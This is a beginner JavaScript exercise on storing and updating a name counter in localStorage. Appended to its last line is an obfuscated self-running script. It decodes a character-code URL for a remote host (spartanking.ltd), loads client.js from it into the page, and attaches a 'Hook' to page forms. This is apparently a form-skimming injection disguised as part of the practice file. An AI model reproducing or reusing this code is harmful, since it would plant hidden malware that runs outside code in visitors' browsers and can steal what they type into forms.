// console.log('hello');
// const fruits = [{ name: 'pineapple' }, { name: 'mango' }, { name: 'papaya' }]

// const election = ['razzak', 'alamgir', 'jayed', 'jayed', 'jayed', 'nipun', 'jayed']

// const election2 = {
// razzak:1,
// alamgir:1,
// jasim:1,
// jayed:4
// }

let db = {};

const addToDb = item => {
    //3 way to add a object 
    // db.alam=1;


    // db['alam']=1;

    const storedTracker = localStorage.getItem('cheka-tracker')

    if (storedTracker) {

        db = JSON.parse(storedTracker)

    }

    if (item in db) {
        db[item] = db[item] + 1
    }

    else {
        db[item] = 1
    }


    console.log(db)
}

// addToDb('manna')
addToDb('bappa')
addToDb('bappa')
addToDb('bappa')
addToDb('bappa')
addToDb('jasim')
addToDb('jasim')
addToDb('jasim')
addToDb('mahi')
addToDb('manna')

localStorage.setItem('fruit', 'mango')
localStorage.setItem('age', 15)

localStorage.setItem('cheka-tracker', db)
localStorage.setItem('cheka-tracker', JSON.stringify(db))

localStorage.getItem('age')

console.log(typeof localStorage.getItem('age'))
console.log(localStorage.getItem('cheka-tracker'))
console.log(localStorage.getItem('cheka-tracker')['jasim'])
console.log(JSON.parse(localStorage.getItem('cheka-tracker'))['mahi'])

const removeItem = item => {

    const storedTracker = localStorage.getItem('cheka-tracker')
    if (storedTracker) {
        const storeObj = JSON.parse(storedTracker)
        delete storeObj[item];
        localStorage.setItem('cheka-tracker', JSON.stringify(storeObj))
    }

}

removeItem('manna')
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b